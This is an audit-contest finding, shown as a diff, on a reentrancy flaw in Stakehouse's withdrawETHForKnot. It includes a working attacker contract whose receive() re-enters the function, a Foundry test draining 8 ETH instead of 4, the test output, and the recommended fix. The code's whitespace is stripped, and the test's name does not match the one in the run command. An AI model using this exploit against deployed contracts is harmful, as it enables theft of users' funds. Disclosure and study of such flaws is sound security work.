@@ -1,0 +1,33 @@
+[H-05] Reentrancy inLiquidStakingManager.sol#withdrawETHForKnowleads to loss of fund from smart wallet
+Submitted byladboy233, also found byTrust,btk,0xbepresent,bitbopper, andyixxas
+https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L435https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L340https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L347
+The code below violates the check effect pattern, the code banned the public key to mark the public key invalid to not let the msg.sender withdraw again after sending the ETH.
+/// @notice Allow node runners to withdraw ETH from their smart wallet. ETH can only be withdrawn until the KNOT has not been staked./// @dev A banned node runner cannot withdraw ETH for the KNOT./// @param _blsPublicKeyOfKnot BLS public key of the KNOT for which the ETH needs to be withdrawnfunctionwithdrawETHForKnot(address_recipient,bytescalldata_blsPublicKeyOfKnot)external{require(_recipient!=address(0),"Zero address");require(isBLSPublicKeyBanned(_blsPublicKeyOfKnot) ==false,"BLS public key has already withdrawn or not a part of LSD network");addressassociatedSmartWallet=smartWalletOfKnot[_blsPublicKeyOfKnot];require(smartWalletOfNodeRunner[msg.sender] ==associatedSmartWallet,"Not the node runner for the smart wallet ");require(isNodeRunnerBanned(nodeRunnerOfSmartWallet[associatedSmartWallet]) ==false,"Node runner is banned from LSD network");require(associatedSmartWallet.balance>=4ether,"Insufficient balance");require(getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) ==IDataStructures.LifecycleStatus.INITIALS_REGISTERED,"Initials not registered");// refund 4 ether from smart wallet to node runner's EOAIOwnableSmartWallet(associatedSmartWallet).rawExecute(_recipient,"",4ether);// update the mappingbannedBLSPublicKeys[_blsPublicKeyOfKnot] =associatedSmartWallet;emitETHWithdrawnFromSmartWallet(associatedSmartWallet,_blsPublicKeyOfKnot,msg.sender);}
+Note the section:
+// refund 4 ether from smart wallet to node runner's EOAIOwnableSmartWallet(associatedSmartWallet).rawExecute(_recipient,"",4ether);// update the mappingbannedBLSPublicKeys[_blsPublicKeyOfKnot] =associatedSmartWallet;
+If the _recipient is a smart contract, it can re-enter the withdraw function to withdraw another 4 ETH multiple times before the public key is banned.
+As shown in our running POC.
+We need to add the import first:
+import{MockAccountManager}from"../../contracts/testing/stakehouse/MockAccountManager.sol";
+We can add the smart contract below:
+https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12
+interfaceIManager{functionregisterBLSPublicKeys(bytes[]calldata_blsPublicKeys,bytes[]calldata_blsSignatures,address_eoaRepresentative)externalpayable;functionwithdrawETHForKnot(address_recipient,bytescalldata_blsPublicKeyOfKnot)external;}contractNonEOARepresentative{addressmanager;boolstate;constructor(address_manager)payable{bytes[]memorypublicKeys=newbytes[](2);publicKeys[0] ="publicKeys1";publicKeys[1] ="publicKeys2";bytes[]memorysignature=newbytes[](2);signature[0] ="signature1";signature[1] ="signature2";IManager(_manager).registerBLSPublicKeys{value:8ether}(publicKeys,signature,address(this));manager=_manager;}functionwithdraw(bytescalldata_blsPublicKeyOfKnot)external{IManager(manager).withdrawETHForKnot(address(this),_blsPublicKeyOfKnot);}receive()externalpayable{if(!state) {state=true;this.withdraw("publicKeys1");}}}
+There is a restriction in this reentrancy attack, the msg.sender needs to be the same recipient when callingwithdrawETHForKnot.
+We add the test case.
+https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35
+functiontestBypassIsContractCheck_POC()public{NonEOARepresentativepass=newNonEOARepresentative{value:8ether}(address(manager));addresswallet=manager.smartWalletOfNodeRunner(address(pass));addressreprenstative=manager.smartWalletRepresentative(wallet);console.log("smart contract registered as a EOA representative");console.log(address(reprenstative) ==address(pass));// to set the public key state to IDataStructures.LifecycleStatus.INITIALS_REGISTEREDMockAccountManager(factory.accountMan()).setLifecycleStatus("publicKeys1",1);// expected to withdraw 4 ETHER, but reentrancy allows withdrawing 8 ETHERpass.withdraw("publicKeys1");console.log("balance after the withdraw, expected 4 ETH, but has 8 ETH");console.log(address(pass).balance);}
+We run the test:
+forgetest-vv--matchtestWithdraw_Reentrancy_POC
+And the result is
+Running1testfortest/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests[PASS]testWithdraw_Reentrancy_POC() (gas:578021)Logs:smart contract registered as a EOA representativetruebalance after the withdraw, expected 4 ETH, but has 8 ETH8000000000000000000Test result: ok. 1 passed; 0 failed; finished in 14.85ms
+The function call is
+pass.withdraw("publicKeys1"), which calls
+functionwithdraw(bytescalldata_blsPublicKeyOfKnot)external{IManager(manager).withdrawETHForKnot(address(this),_blsPublicKeyOfKnot);}
+Which trigger:
+// refund 4 ether from smart wallet to node runner's EOAIOwnableSmartWallet(associatedSmartWallet).rawExecute(_recipient,"",4ether);
+Which triggers reentrancy to withdraw the fund again before the public key is banned.
+receive()externalpayable{if(!state) {state=true;this.withdraw("publicKeys1");}}
+Recommended Mitigation Steps
+We recommend ban the public key first then send the fund out, and use openzeppelin nonReentrant modifier to avoid reentrancy.
+// update the mappingbannedBLSPublicKeys[_blsPublicKeyOfKnot] =associatedSmartWallet;// refund 4 ether from smart wallet to node runner's EOAIOwnableSmartWallet(associatedSmartWallet).rawExecute(_recipient,"",4ether);
+vince0656 (Stakehouse) confirmed
